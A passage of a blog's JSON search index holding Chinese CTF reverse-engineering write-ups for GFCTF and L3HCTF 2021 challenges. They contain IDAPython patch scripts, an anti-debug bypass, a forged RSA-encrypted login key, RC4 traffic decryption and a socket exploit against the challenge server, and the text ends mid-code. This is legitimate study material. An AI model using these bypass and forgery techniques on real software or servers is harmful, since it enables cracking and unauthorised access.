关于这个题的详细题解可以参考 https://zzzzsky.com/2021/11/29/NCTF2021_RE_WP/ 参考文章https://www.cnblogs.com/xuan52rock/p/11010304.html https://blog.csdn.net/Breeze_CAT/article/details/106298559 https://www.i4k.xyz/article/haodawei123/104060906","categories":[{"name":"安卓","slug":"安卓","permalink":"https://zzzzsky.github.io/categories/%E5%AE%89%E5%8D%93/"}],"tags":[{"name":"真机调试","slug":"真机调试","permalink":"https://zzzzsky.github.io/tags/%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95/"},{"name":"安卓","slug":"安卓","permalink":"https://zzzzsky.github.io/tags/%E5%AE%89%E5%8D%93/"}]},{"title":"2021GFCTF部分RE_WP","slug":"2021GFCTF_WP","date":"2021-11-25T09:05:00.000Z","updated":"2021-11-29T11:41:47.513Z","comments":true,"path":"2021/11/25/2021GFCTF_WP/","link":"","permalink":"https://zzzzsky.github.io/2021/11/25/2021GFCTF_WP/","excerpt":"","text":"2021GFCTF RE_WPwordy去除花指令 123456789addr =0X556AE377FD56end = 0x0556AE377FE40flag = &quot;&quot;for i in range(addr, end, 13): c = get_bytes(i+4, 1)[0] flag+=chr(c) print(flag)# GFCTF&#123;u_are2wordy&#125; BabyReverseIDA打开，去除所有的花指令 直接看下面对flag如何加密的，进入sub_412E10, 发现是SM4加密 而传入的第二个参数是key，即byte_4409c0是key，回到main函数再往上看，发现前面有一个对byte_4409c0类似RC4加密的操作, 对 byte_4409C0进行交叉引用 于是下断点调试来获取key，发现不行，猜测前面是反调试，从main函数头部下断点调试 最终定位到这个函数 采用的是self_mapping技术实现反调试，本质是创建secion的时候设置SEC_NO_CHANGE，映射后不能改变 Self-Remapping-Code 关于这个技术，可以参考下这位大佬的笔记 https://jev0n.com/2021/09/23/Self-Remapping.html 我们直接将call sub_411CE0 的地方nop掉，手动的把byte_4409c0的地方加1 12345678a = [ 0x07, 0xB8, 0x0D, 0x24, 0xB1, 0x0C, 0x2D, 0xC7, 0x28, 0x2D, 0xC3, 0x61, 0x66, 0x4F, 0x72, 0x13] addr = 0x04409C0for i in range(16): patch_byte(addr+i, a[i]+1)print(&quot;OK&quot;) 运行起来 得到key为 GF?-&gt;GirlFriend? 提取密文 10D 40 3B 87 A5 66 DA 74 92 7F BB E1 B8 CD EB BC 59 45 1B C0 38 99 AA 22 AA 3F 9D 21 07 4E 81 1F SM4在线解密 2e69df5961f20aee0897cf1905156344 , 最终得到flag为 GFCTF&#123;2e69df5961f20aee0897cf1905156344&#125; re_EasyRE_0x00IDA打开分析，最关键的是sub_100016A0函数 经过分析，发现sub_10001180是解密login.key文件，生成的数据放到V13里面 然后下面这个地方是将V13处的数据与生成的一些数据进行对比，猜测是机器码的验证 这是V13处的数据 111 55 66 55 0D 50 51 0C FF 01 80 12 CE A9 08 75 73 65 72 32 33 33 33 最后8个字符是user2333 将对比的数据也提取出来, 然后结合题目，用户名用admin6677登录，长度是9，整理得 111 55 66 55 98 FA 9B 59 6F F6 14 8F E9 DA 09 61 64 6D 69 6E 36 36 37 37 我们写脚本，每次运行到对比数据的时候就把v13的数据给他替换掉 12345data = [0x11, 0x55, 0x66, 0x55, 0x98, 0xFA, 0x9B, 0x59, 0x6F, 0xF6, 0x14, 0x8F, 0xE9, 0xDA, 0x09, 0x61, 0x64, 0x6D, 0x69, 0x6E, 0x36, 0x36, 0x37, 0x37]addr = 0x004CB348 # v13的地址for i in range(len(data)): patch_byte(addr+i, data[i])print(&quot;OK&quot;) 然后绕过机器码验证，往下走，来到sub_10001610处 可以发现，这个地方肯定是与服务器通信了，我们直接运行，直接Wireshark抓包 提取数据 1234567---&gt; 11 55 66 55 1a 27 00 00 00 00 &lt;--- 11 55 66 55 66 27 00 00 0f 00 f3 46 8a be 81 62 ed 36 d5 df 28 dc 04 8a fd ---&gt; 11 55 66 55 1a 27 01 00 40 00 0e a2 60 19 1f df 39 0d bc 62 48 57 5a 11 87 78 69 11 03 76 4b f9 2c 1f 35 fd ff 4a b8 d8 63 8f b6 b1 f0 cd d3 90 2d 27 05 b7 1e 01 22 74 91 1a a4 53 df 1d f4 69 7d 3e 29 bd d3 30 da 94 a3 03 &lt;--- 11 55 66 55 66 27 01 00 48 00 84 cb 11 ef 71 51 30 0b b3 d8 c1 22 ac c4 ca f1 29 12 cf 79 f5 36 5f 5a 5e a8 f5 fa 62 3c e8 32 69 d6 a1 54 eb 1b 06 06 b0 68 20 5a 62 ea 48 ec 8a 3d 5c 40 d0 a8 03 94 6a 2e b7 f0 e4 33 aa a0 e3 f2 da f8 a9 cf 5d 92 重新调试，接着刚才的位置往下分析，看到了RC4的初始化及加密 猜测是刚开始，服务器端返回RC4的key，然后后面全部使用RC4加密方式进行加密 根据sub_10001350这个函数可以猜测出数据包的格式, 拿上面服务器返回的key举例子 1234511 55 66 55 //标志66 27 //版本00 00 //命令0f 00 //后面数据的长度f3 46 8a be 81 62 ed 36 d5 df 28 dc 04 8a fd //数据，当命令为0的时候，是RC4的key，命令为1和2的时候，是RC4加密的数据 写脚本验证RC4加密 1234567891011121314151617181920212223242526272829303132from Crypto.Cipher import ARC4 as rc4cipherimport binasciidef rc4_algorithm(encrypt_or_decrypt, data, key1): if encrypt_or_decrypt == &quot;enc&quot;: key = key1 enc = rc4cipher.new(key) res = enc.encrypt(data) return res elif encrypt_or_decrypt == &quot;dec&quot;: key = key1 enc = rc4cipher.new(key) res = enc.decrypt(data) return reskey = binascii.unhexlify(&quot;f3468abe8162ed36d5df28dc048afd&quot;)data1 = binascii.unhexlify( &quot;0ea260191fdf390dbc6248575a118778691103764bf92c1f35fdff4ab8d8638fb6b1f0cdd3902d2705b71e012274911aa453df1df4697d3e29bdd330da94a303&quot;)m1 = rc4_algorithm(&quot;dec&quot;, data1, key)data2 = binascii.unhexlify( &quot;84cb11ef7151300bb3d8c122acc4caf12912cf79f5365f5a5ea8f5fa623ce83269d6a154eb1b0606b068205a62ea48ec8a3d5c40d0a803946a2eb7f0e433aaa0e3f2daf8a9cf5d92&quot;)m2 = rc4_algorithm(&quot;dec&quot;, data2, key)print(m1)print(m2)# b&#x27;\\x8ayqv,\\x8eYjj\\xdb\\xfa\\x10\\xd6\\xa0=\\xed!w\\xa9/\\xdd\\xa3\\x1a \\x05!+\\xbd\\xd0\\xa7\\xe7\\xd4\\xba\\t%\\xb9N\\xeeYR\\xdc\\xb0Pfq\\xae\\xe9\\xc7\\x1eB\\xa3\\x0eA\\xb3\\x08\\xcf1\\xb3\\x12\\xa5L\\xd4`\\xcc&#x27;# b&#x27;\\x00\\x10\\x00\\x80B\\x00Please update client!\\r\\nClient version=10010, Server version=10086\\x00&#x27; 结合login.key，发现当命令为1的时候，向服务器发送的是login.key的数据，然后服务器返回信息 所以现在需要构造 真正的login.key(11 55 66 55 98 FA 9B 59 6F F6 14 8F E9 DA 09 61 64 6D 69 6E 36 36 37 37) 加密后的数据 sub_10001180是解密函数，进去分析,发现是RSA的PKCS#1加密 根据这个结构找到e和n 提取出来 12345e: 65537n: 0xd928b8efe000f72db5bda67a9aa0740defb555b2603736eecd6d01f38ef2fc79分解得到p, qp = 322922590106035145437937724697895880569q = 304171468404401467258708275665013611777 利用rsatool.py生成private.pem 1python rsatool.py -e 65537 -p 322922590106035145437937724697895880569 -q 304171468404401467258708275665013611777 -o private.pem 利用在线解密网站测试 https://the-x.cn/cryptography/Rsa.aspx 发现解密成功，将构造好的数据进行加密， 对于PKCS#1的填充方式可以参考下面2篇文章 https://www.cloudcared.cn/3155.html https://www.cnblogs.com/feng9exe/p/8075447.html 然后写程序与服务器交互，发现服务器返回命令为2的验证码问题 Question(Send result in uint32_t format, 1 second!): 9540808 * 32 + 509 * 859 = ? 然后利用eval计算数值，构造，返回给服务器，即可得到flag，完整的exp如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import socketfrom Crypto.Cipher import ARC4 as rc4cipherimport reimport structlogin_key = [0x5D, 0x98, 0xEE, 0x8B, 0x68, 0x86, 0x2F, 0x56, 0xBA, 0xA1, 0x27, 0x2A, 0x68, 0x8B, 0x19, 0x31, 0x37, 0xC1, 0x2B, 0x1A, 0x80, 0x5F, 0xAB, 0x8C, 0xE0, 0xE6, 0x81, 0xDF, 0x05, 0xC6, 0xB1, 0x2F, 0x0E, 0x59, 0xC8, 0x45, 0x8A, 0x7D, 0x83, 0x35, 0x5F, 0x02, 0x05, 0x10, 0x8A, 0x35, 0x6D, 0x0C, 0xE8, 0x3C, 0x9C, 0x15, 0xD7, 0xDA, 0xF0, 0x96, 0x6D, 0x2E, 0x77, 0xEC, 0x78, 0x3B, 0x83, 0xB2]def rc4_algorithm(encrypt_or_decrypt, data, key1): if encrypt_or_decrypt == &quot;enc&quot;: key = key1 enc = rc4cipher.new(key) res = enc.encrypt(data) return res elif encrypt_or_decrypt == &quot;dec&quot;: key = key1 enc = rc4cipher.new(key) res = enc.decrypt(data) return resdef get_data(_cmd, _len, _data, _key): sig = [0x11, 0x55, 0x66, 0x55] # 签名 banben = [0x66, 0x27] # 版本 cmd_list = [_cmd, 0x00] # 命令 data_len_list = [_len, 0x00] # 数据长度 if _len != 0: return bytes(sig + banben + cmd_list + data_len_list) + rc4_algorithm(&#x27;enc&#x27;, bytes(_data), _key) return bytes(sig + banben + cmd_list + data_len_list)def get_captcha(_captcha_str): m = re.search( r&quot;Question\\(Send result in uint32_t format, 1 second!\\): (.*?) = &quot;, _captcha_str) c = eval(m.group(1)) return struct.pack(&quot;I&quot;, c)if __name__ == &#x27;__main__&#x27;: address = (&#x27;119.27.179.145&#x27;, 10086) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(address) s.send(get_data(0, 0, [], None)) data = s.recv(1024) rc4_key = data[10:] # 获取RC4密钥 s.send(get_data(1, 0x40, login_key, rc4_key)) data = s.recv(1024) captcha_str = rc4_algorithm(&quot;dec&quot;, data[10:], rc4_key).decode() captcha = get_captcha(captcha_str) # 计算得到验证码 print(f&quot;Captcha: &#123;captcha&#125;&quot;) # 向服务器返回验证码 send_data = get_data(2, len(captcha), list(captcha), rc4_key) s.send(send_data) data = s.recv(1024) m = rc4_algorithm(&quot;dec&quot;, data[10:], rc4_key) print(m) s.close() # Captcha: b&#x27;\\xc84\\x06\\x03&#x27; # b&#x27;\\x00\\x10\\x00\\x805\\x00flag_0x00 = \\x00GFCTF&#123;e8e9071b7a70770bec1f6415c4ed4c1d&#125;\\x00&#x27; 得到flag为 GFCTF&#123;e8e9071b7a70770bec1f6415c4ed4c1d&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"CTFWP","slug":"CTFWP","permalink":"https://zzzzsky.github.io/tags/CTFWP/"}]},{"title":"2021 L3HCTF 部分RE WP","slug":"2021L3HCTF_WP_RE_","date":"2021-11-17T02:00:00.000Z","updated":"2021-11-29T11:41:58.907Z","comments":true,"path":"2021/11/17/2021L3HCTF_WP_RE_/","link":"","permalink":"https://zzzzsky.github.io/2021/11/17/2021L3HCTF_WP_RE_/","excerpt":"","text":"2021 L3HCTF 部分RE WPdouble-joyIDA打开程序，找到main函数进行分析 最关键的是enc_flag 函数, 经过调试，发现传入的参数有2套，都是固定的结构体 1234567typedef struct _struc_1&#123; BYTE* pKey; //指向OPCODE _DWORD* pFlag; //指向FLAG，主要这个FLAG前40个字节是用户输入的，后面一大部分要留给程序用 int i; //指向OPCODE的索引 int stack; //指向了一些 “操作数”，在OPCODE 中存着，比如OPCODE是 \\XE的话，后面4个字节就是一个“操作数”&#125;struc_1; 进入 enc_flag函数，F5，发现很乱，然后patch掉一些用于对齐的代码后，F5, 发现是个VM 调试，发现一共执行了0XCA次 enc_flag, 并且传入的参数是交替的 还原程序代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334#include &lt;windows.h&gt;#include &lt;basetsd.h&gt;#include &lt;stdio.h&gt;typedef unsigned int uint32;#define _DWORD uint32typedef struct _struc_1&#123; BYTE* pKey; //指向OPCODE _DWORD* pFlag; //指向FLAG，主要这个FLAG前40个字节是用户输入的，后面一大部分要留给程序用 int i; //指向OPCODE的索引 int stack; //指向了一些 “操作数”，在OPCODE 中存着，比如OPCODE是 \\XE的话，后面4个字节就是一个“操作数”&#125;struc_1;BYTE key1[] =&#123; 0x11, 0x15, 0x00, 0x00, 0x00, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x0E, 0x15, 0xCD, 0x5B, 0x07, 0x08, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x0E, 0xB1, 0x68, 0xDE, 0x3A, 0x08, 0x0E, 0x12, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x0C, 0x01, 0x0B, 0x0A, 0x10, 0x44, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x01, 0x01, 0x01, 0x01, 0x02, 0x07, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0F, 0xA8, 0xFF, 0xFF, 0xFF, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x4C, 0x49, 0x00, 0x00, 0x08, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x76, 0x6F, 0x00, 0x00, 0x08, 0x0E, 0x02, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x20, 0x65, 0x00, 0x00, 0x08, 0x0E, 0x03, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x55, 0x43, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x0C, 0x01, 0x0B, 0x0A, 0x10, 0x56, 0x01, 0x00, 0x00, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x0C, 0x01, 0x0B, 0x0A, 0x10, 0x20, 0x01, 0x00, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x08, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x08, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x10, 0x00, 0x00, 0x00, 0x02, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x20, 0x00, 0x00, 0x00, 0x0C, 0x03, 0x07, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x00, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x03, 0x00, 0x00, 0x00, 0x05, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x07, 0x00, 0x08, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x09, 0x00, 0x08, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x10, 0x00, 0x00, 0x00, 0x02, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x20, 0x00, 0x00, 0x00, 0x0C, 0x03, 0x07, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x00, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x08, 0x00, 0x00, 0x0C, 0x03, 0x0E, 0x03, 0x00, 0x00, 0x00, 0x05, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x07, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x08, 0x12, 0x01, 0x00, 0x00, 0x00, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0F, 0xCC, 0xFE, 0xFF, 0xFF, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x02, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0F, 0x96, 0xFE, 0xFF, 0xFF, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;BYTE key2[] =&#123; 0x11, 0x15, 0x00, 0x00, 0x00, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x0E, 0xF7, 0xCB, 0x54, 0x01, 0x08, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x0E, 0xAD, 0xDE, 0xED, 0x5E, 0x08, 0x0E, 0x12, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x0C, 0x01, 0x0B, 0x0A, 0x10, 0x44, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x01, 0x01, 0x01, 0x01, 0x02, 0x07, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0F, 0xA8, 0xFF, 0xFF, 0xFF, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x54, 0x53, 0x00, 0x00, 0x08, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x4D, 0x4F, 0x00, 0x00, 0x08, 0x0E, 0x02, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x74, 0x20, 0x00, 0x00, 0x08, 0x0E, 0x03, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x61, 0x65, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x0C, 0x01, 0x0B, 0x0A, 0x10, 0x5B, 0x01, 0x00, 0x00, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x0C, 0x01, 0x0B, 0x0A, 0x10, 0x25, 0x01, 0x00, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x08, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x08, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0A, 0x00, 0x00, 0x00, 0x09, 0x00, 0x08, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x10, 0x00, 0x00, 0x00, 0x02, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x00, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x20, 0x00, 0x00, 0x00, 0x0C, 0x03, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x07, 0x07, 0x00, 0x08, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x10, 0x00, 0x00, 0x00, 0x02, 0x0E, 0x02, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x20, 0x00, 0x00, 0x00, 0x0C, 0x03, 0x0E, 0x03, 0x00, 0x00, 0x00, 0x0E, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x07, 0x07, 0x00, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x0C, 0x00, 0x00, 0x00, 0x09, 0x08, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x08, 0x12, 0x01, 0x00, 0x00, 0x00, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x0E, 0x14, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x01, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0F, 0xC7, 0xFE, 0xFF, 0xFF, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x02, 0x00, 0x00, 0x00, 0x00, 0x08, 0x0F, 0x91, 0xFE, 0xFF, 0xFF, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00&#125;;void enc_flag(struc_1* st)&#123; BYTE* pKey = st-&gt;pKey; BYTE opcode = 0; _DWORD* pFlag = st-&gt;pFlag; int data1, data2, tmp, index; while (true) &#123; opcode = pKey[st-&gt;i]; //取出对应的opcode st-&gt;i++; //每取出一个opcode， 索引就+1 printf(&quot;------&gt;OPCODE :%d\\n&quot;, opcode); switch (opcode) &#123; case 0: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 + data2; printf(&quot;pFlag[%d] = pFlag[%d]:%#x + pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 1: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 - data2; printf(&quot;pFlag[%d] = pFlag[%d]:%#x - pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 2: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 * data2; printf(&quot;pFlag[%d] = pFlag[%d]:%#x * pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 3: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 / data2; printf(&quot;pFlag[%d] = pFlag[%d]:%#x / pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 4: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 % data2; printf(&quot;pFlag[%d] = pFlag[%d]:%#x %% pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 5: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 &amp; data2; printf(&quot;pFlag[%d] = pFlag[%d]:%#x &amp; pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 6: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 | data2; printf(&quot;pFlag[%d] = pFlag[%d]:%#x | pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 7: st-&gt;stack--; data1 = pFlag[st-&gt;stack]; data2 = pFlag[st-&gt;stack - 1]; pFlag[st-&gt;stack - 1] = data1 ^ data2; printf(&quot;pFlag[%d] = pFlag[%d]:%#x ^ pFlag[%d]:%#x;\\n&quot;, st-&gt;stack - 1, st-&gt;stack, data1, st-&gt;stack - 1, data2); continue; case 8: st-&gt;stack--; tmp = pFlag[st-&gt;stack]; index = pFlag[st-&gt;stack - 1]; pFlag[index] = tmp; printf(&quot;pFlag[%d] = %#x;\\n&quot;, index, tmp); st-&gt;stack--; continue; case 9: index = pFlag[st-&gt;stack - 1]; data1 = pFlag[index]; pFlag[st-&gt;stack - 1] = data1; printf(&quot;pFlag[%d] = %#x;\\n&quot;, st-&gt;stack -1, data1); continue; case 10: tmp = pFlag[st-&gt;stack - 1]; if (tmp == 0) &#123; pFlag[st-&gt;stack - 1] = 1; printf(&quot;pFlag[%d] = 1;\\n&quot;, st-&gt;stack - 1); &#125; else &#123; pFlag[st-&gt;stack - 1] = 0; printf(&quot;pFlag[%d] = 0;\\n&quot;, st-&gt;stack - 1); &#125; continue; case 11: tmp = pFlag[st-&gt;stack - 1]; if ((int)tmp &lt; 0) &#123; pFlag[st-&gt;stack - 1] = 1; printf(&quot;pFlag[%d] = 1;\\n&quot;, st-&gt;stack - 1); &#125; else &#123; pFlag[st-&gt;stack - 1] = 0; printf(&quot;pFlag[%d] = 0;\\n&quot;, st-&gt;stack - 1); &#125; continue; case 12: data1 = pFlag[st-&gt;stack - 1]; data2 = pFlag[st-&gt;stack - 2]; pFlag[st-&gt;stack - 1] = data2; pFlag[st-&gt;stack - 2] = data1; printf(&quot;exchange pFlag[%d]:%#x, pFlag[%d]:%#x\\n&quot;, 